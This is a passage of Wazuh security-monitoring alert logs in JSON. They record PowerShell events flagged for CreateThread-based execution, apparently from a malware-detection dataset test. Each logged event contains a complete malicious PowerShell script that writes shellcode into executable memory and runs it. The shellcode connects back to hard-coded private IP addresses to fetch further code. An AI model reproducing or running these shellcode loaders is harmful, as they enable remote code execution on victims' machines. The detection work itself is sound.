a5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 1d606550-7201-4c87-a789-faa28e5944af\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\144.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x6e,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"1d606550-7201-4c87-a789-faa28e5944af","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\144.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:26.570+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":44,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304306.1965116","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:46.4275251Z","eventRecordID":"144840","processID":"8692","threadID":"1964","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x16,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 69e7fecd-3ab7-44b3-9207-d68db3634f13\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1440.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x16,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"69e7fecd-3ab7-44b3-9207-d68db3634f13","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1440.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:26.626+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":45,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304306.1976121","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:47.2839612Z","eventRecordID":"144844","processID":"5840","threadID":"7040","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xc7,0x01,0x36,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 519d5272-6c6d-44ef-ae4c-34e86eaef79d\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1451.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xc7,0x01,0x36,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"519d5272-6c6d-44ef-ae4c-34e86eaef79d","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1451.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:28.164+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":46,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304308.1987070","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:48.1057790Z","eventRecordID":"144848","processID":"4236","threadID":"8824","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x08,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 82bd69d5-788a-47e8-bea4-a08c020de640\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1461.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x08,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 